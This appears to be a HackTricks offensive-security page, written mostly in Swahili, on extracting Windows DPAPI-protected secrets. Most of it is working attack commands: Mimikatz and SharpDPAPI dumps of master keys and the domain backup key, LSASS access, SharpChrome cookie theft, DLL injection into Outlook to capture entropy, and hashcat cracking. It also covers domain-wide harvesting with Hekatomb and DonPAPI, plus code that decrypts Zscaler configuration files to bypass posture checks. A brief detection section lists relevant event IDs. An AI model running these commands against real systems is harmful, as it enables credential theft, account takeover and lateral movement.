# DPAPI - Kuchukua Nenosiri

{{#include ../../banners/hacktricks-training.md}}



## DPAPI ni nini

The Data Protection API (DPAPI) hutumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya **symmetric encryption of asymmetric private keys**, ikitumia siri za mtumiaji au za mfumo kama chanzo kikuu cha entropy. Njia hii inarahisisha usimbuaji kwa watengenezaji programu kwa kuwa inawawezesha kusimbua data kwa kutumia funguo inayotokana na siri za kuingia za mtumiaji au, kwa usimbuaji wa mfumo, siri za uthibitishaji za domain ya mfumo, hivyo kuondoa haja ya watengenezaji kusimamia ulinzi wa funguo ya usimbuaji wenyewe.

Njia ya kawaida ya kutumia DPAPI ni kupitia kazi za **`CryptProtectData` na `CryptUnprotectData`**, ambazo kuruhusu programu kusimbua na kusomoa data kwa usalama kwa kikao cha mchakato ulioko umeingia sasa. Hii inamaanisha kuwa data iliyosimbwa inaweza kusomwa tu na mtumiaji au mfumo uleule uliyoisimbua.

Zaidi ya hayo, kazi hizi pia zinakubali kigezo cha **`entropy`** ambacho kinatumika wakati wa kusimbua na kusomea, kwa hiyo, ili kusomea kitu kilichosimbwa kwa kutumia kigezo hiki, lazima utoe thamani ileile ya entropy iliyotumika wakati wa kusimbua.

### Uundaji wa funguo za watumiaji

DPAPI inaleta funguo ya kipekee (inayoitwa **`pre-key`**) kwa kila mtumiaji kulingana na credentials zao. Funguo hii inatokana na nenosiri la mtumiaji na mambo mengine, na algoriti inategemea aina ya mtumiaji lakini inamalizika kuwa SHA1. Kwa mfano, kwa watumiaji wa domain, **inategemea NTLM hash ya mtumiaji**.

Hili ni jambo la kuvutia hasa kwa sababu ikiwa mshambuliaji anaweza kupata hash ya nenosiri la mtumiaji, wanaweza:

- **Decrypt any data that was encrypted using DPAPI** kwa kutumia funguo ya mtumiaji huyo bila hitaji la kuwasiliana na API yoyote
- Jaribu **crack the password** offline kwa kujaribu kuunda funguo halali za DPAPI

Zaidi ya hayo, kila wakati data inaposimbwa na mtumiaji kwa kutumia DPAPI, **funguo kuu** mpya inazalishwa. Funguo kuu hii ndiyo inayotumika kwa kweli kusimbua data. Kila funguo kuu hupewa **GUID** (Globally Unique Identifier) inayoitambulisha.

Funguo kuu zinahifadhiwa katika saraka ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya mtumiaji huyo. Funguo kuu huhifadhiwa imefungwa na `pre-key` ya mtumiaji na pia na domain backup key kwa ajili ya urejesho (hivyo funguo ile ile huhifadhiwa imefungwa mara 2 kwa njia mbili tofauti).

Tambua kwamba **domain key inayotumika kusimbua funguo kuu iko kwenye domain controllers na haibadiliki kamwe**, hivyo ikiwa mshambuliaji ana ufikiaji wa domain controller, anaweza kupata domain backup key na kusoma funguo kuu za watumiaji wote kwenye domain.

Blob zilizofungwa zina ndani ya vichwa vyazo **GUID ya funguo kuu** iliyotumika kusimbua data.

> [!TIP]
> Blobs zilizofungwa za DPAPI huanza na **`01 00 00 00`**

Tafuta funguo kuu:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### Machine/System key generation

Hii ni key inayotumika kwa machine ku-encrypt data. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni key maalum ambayo mtumiaji SYSTEM pekee anaweza kuipata. Key hii inatumiwa ku-encrypt data ambayo inahitaji kupatikana na mfumo wenyewe, kama vile machine-level credentials au siri za mfumo mzima.

Note that these keys **don't have a domain backup** so they are only accesisble locally:

- **Mimikatz** inaweza kuifikia kwa kutoa LSA secrets kwa kutumia amri: `mimikatz lsadump::secrets`
- Siri hiyo imehifadhiwa ndani ya registry, hivyo msimamizi anaweza **modify the DACL permissions to access it**. The registry path is: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### Protected Data by DPAPI

Miongoni mwa data za kibinafsi zilizolindwa na DPAPI ni:

- Windows creds
- Internet Explorer and Google Chrome's passwords and auto-completion data
- E-mail and internal FTP account passwords for applications like Outlook and Windows Mail
- Passwords for shared folders, resources, wireless networks, and Windows Vault, including encryption keys
- Passwords for remote desktop connections, .NET Passport, and private keys for various encryption and authentication purposes
- Network passwords managed by Credential Manager and personal data in applications using CryptProtectData, such as Skype, MSN messenger, and more
- Encrypted blobs inside the register
- ...

System protected data includes:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Kwa ruhusa za msimamizi wa ndani, inawezekana **kufikia kumbukumbu ya LSASS** ili kutoa funguo kuu za DPAPI za watumiaji wote waliounganishwa na funguo ya SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ikiwa mtumiaji ana local admin privileges, anaweza kupata **DPAPI_SYSTEM LSA secret** ili kudekripta funguo kuu za mashine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
Ikiwa neno la siri au hash NTLM ya mtumiaji linajulikana, unaweza **kufungua funguo kuu za mtumiaji moja kwa moja**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ikiwa uko ndani ya session kama mtumiaji, inawezekana kumuomba DC kwa **backup key to decrypt the master keys using RPC**. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **steal his session token** kwa hili:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Orodhesha Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Kufikia DPAPI data iliyosimbwa

### Tafuta DPAPI data iliyosimbwa

Faili za kawaida za watumiaji ambazo **zimelindwa** ziko katika:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Angalia pia kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo juu.

Mifano ya kuorodhesha:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata DPAPI encrypted blobs kwenye file system, registry na B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo hiyo hiyo) inaweza kutumika ku-decrypt data nyeti za DPAPI kama cookies.

### Vifunguo vya ufikiaji na data

- **Tumia SharpDPAPI** kupata credentials kutoka kwa DPAPI encrypted files kutoka kwenye current session:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pata credentials info** kama encrypted data na guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Fikia masterkeys**:

Dekripta masterkey ya mtumiaji aliyemuomba **domain backup key** kwa kutumia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Zana ya **SharpDPAPI** pia inaunga mkono hoja hizi kwa masterkey decryption (tazama jinsi inavyowezekana kutumia `/rpc` kupata domain backup key, `/password` kutumia plaintext password, au `/pvk` kutaja DPAPI domain private key file...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Dekripti data kwa kutumia masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Zana ya **SharpDPAPI** pia inaunga mkono hoja hizi za `credentials|vaults|rdg|keepass|triage|blob|ps` kwa ajili ya kuvunja usimbaji (angalia jinsi inavyowezekana kutumia `/rpc` kupata ufunguo wa chelezo wa domain, `/password` kutumia nywila ya maandishi wazi, `/pvk` kubainisha faili ya ufunguo binafsi wa DPAPI domain, `/unprotect` kutumia kikao la mtumiaji wa sasa...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Decrypt baadhi ya data kwa kutumia **kikao la mtumiaji wa sasa**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### Kushughulikia Entropy ya Hiari ("Entropy ya mtu wa tatu")

Baadhi ya programu huipatia `CryptProtectData` thamani ya ziada ya **entropy**. Bila thamani hii blob haiwezi kufichuliwa, hata kama masterkey sahihi inajulikana. Kupata entropy ni muhimu hivyo wakati wa kulenga cheti za kuingia zilizo lindwa kwa njia hii (kwa mfano Microsoft Outlook, baadhi ya wateja wa VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni DLL ya user-mode inayobandika DPAPI functions ndani ya mchakato lengwa na kurekodi kwa uwazi entropy yoyote ya hiari iliyotolewa. Kuendesha EntropyCapture katika mode ya **DLL-injection** dhidi ya michakato kama `outlook.exe` au `vpnclient.exe` kutatoa faili inayofananisha kila buffer ya entropy na mchakato uliopiga simu na blob. Entropy iliyorekodiwa baadaye inaweza kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili kufichua data.
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ilianzisha muundo wa masterkey wa **context 3** kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desemba 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3) zinazoruhusu GPU-accelerated cracking ya nywila za watumiaji moja kwa moja kutoka kwa faili la masterkey. Wavamizi kwa hivyo wanaweza kufanya mashambulizi ya word-list au brute-force bila kuingiliana na mfumo wa lengo.

`DPAPISnoop` (2024) inautomatisha mchakato:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Chombo pia kinaweza kuchambua Credential na Vault blobs, ku-decrypt kwa cracked keys, na kusafirisha cleartext passwords.

### Kupata data za mashine nyingine

Katika **SharpDPAPI and SharpChrome** unaweza kuonyesha chaguo la **`/server:HOST`** ili kupata data za mashine ya mbali. Bila shaka lazima uwe na uwezo wa kufikia mashine hiyo na katika mfano ufuatao inadhaniwa kwamba **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Zana nyingine

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni zana inayotekeleza kwa njia ya moja kwa moja uondoaji wa watumiaji wote na kompyuta kutoka kwenye saraka ya LDAP na uondoaji wa domain controller backup key kupitia RPC. Skripti kisha itatatua anwani za IP za kompyuta zote na kufanya smbclient kwenye kompyuta zote ili kupata DPAPI blobs za watumiaji wote na kuyafungua yote kwa domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa kutumia orodha ya kompyuta iliyochimbuliwa kutoka LDAP unaweza kupata kila sub network hata kama hukuwajua!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kuteremsha siri zilizoilindwa na DPAPI kwa njia ya moja kwa moja. Toleo la 2.x lilianzisha:

* Ukusanyaji sambamba wa blobs kutoka kwa mamia ya hosts
* Kuchanganua masterkeys za **context 3** na ujumuishaji wa kukoropa kiotomatiki wa Hashcat
* Msaada kwa Chrome "App-Bound" encrypted cookies (see next section)
* Hali mpya ya **`--snapshot`** ya kuwasiliana mara kwa mara na endpoints na kutofautisha blobs zilizoundwa hivi karibuni

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni parser ya C# kwa faili za masterkey/credential/vault ambazo zinaweza kutoa formats za Hashcat/JtR na hiari kuanzisha kukoropa kiotomatiki. Inaunga mkono kikamilifu muundo wa masterkey wa machine na user hadi Windows 11 24H1.


## Ugunduzi wa kawaida

- Ufikiaji wa faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na saraka nyingine zinazohusiana na DPAPI.
- Hasa kutoka kwenye network share kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au zana zinazofanana kupata kumbukumbu ya LSASS au kudump masterkeys.
- Event **4662**: *An operation was performed on an object* – inaweza kuhusishwa na ufikiaji wa kitu cha **`BCKUPKEY`**.
- Event **4673/4674** wakati mchakato unaomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### 2023-2025 udhaifu & mabadiliko ya mazingira

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Mshambuliaji aliye na ufikiaji wa mtandao angeweza kumdanganya mwanachama wa domain kupata malicious DPAPI backup key, kuruhusu ufichuzi wa masterkeys za watumiaji. Imerekebishwa katika sasisho la jumla la Novemba 2023 – wasimamizi wanapaswa kuhakikisha DCs na workstations zimeboreshwa kikamilifu.
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ilibadilisha ulinzi wa zamani wa DPAPI-peke yake kwa kuongezwa kwa ufunguo uliohifadhiwa chini ya Credential Manager ya mtumiaji. Offline decryption ya cookies sasa inahitaji pamoja DPAPI masterkey na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kupata ufunguo huo wa ziada wakati zinaendeshwa kwa muktadha wa mtumiaji.


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector inahifadhi faili kadhaa za usanidi chini ya `C:\ProgramData\Zscaler` (e.g. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila faili imefumwa kwa **DPAPI (Machine scope)** lakini muuzaji anatoa **custom entropy** ambayo *inahesabiwa wakati wa utekelezaji* badala ya kuhifadhiwa kwenye diski.

Entropy hiyo inajengwa upya kutoka kwa vipengele viwili:

1. A hard-coded secret embedded inside `ZSACredentialProvider.dll`.
2. The **SID** of the Windows account the configuration belongs to.

The algorithm implemented by the DLL is equivalent to:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Kwa kuwa siri imeingizwa katika DLL inayoweza kusomwa kutoka diski, **mshambuliaji yeyote wa ndani mwenye haki za SYSTEM anaweza kuregenereta entropy kwa SID yoyote** na decrypt blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Uchomaji wa data zilizofichwa (decryption) hutoa usanidi kamili wa JSON, ikiwa ni pamoja na kila **device posture check** na thamani yake inayotarajiwa – taarifa ambayo ni ya thamani sana wakati wa kujaribu client-side bypasses.

> TIP: artefakti nyingine zilizofichwa (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zinalindwa na DPAPI **bila** entropy (`16` zero bytes). Kwa hivyo zinaweza kufunguliwa moja kwa moja kwa `ProtectedData.Unprotect` mara tu idhinisho za SYSTEM zitakapopatikana.

## Marejeleo

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
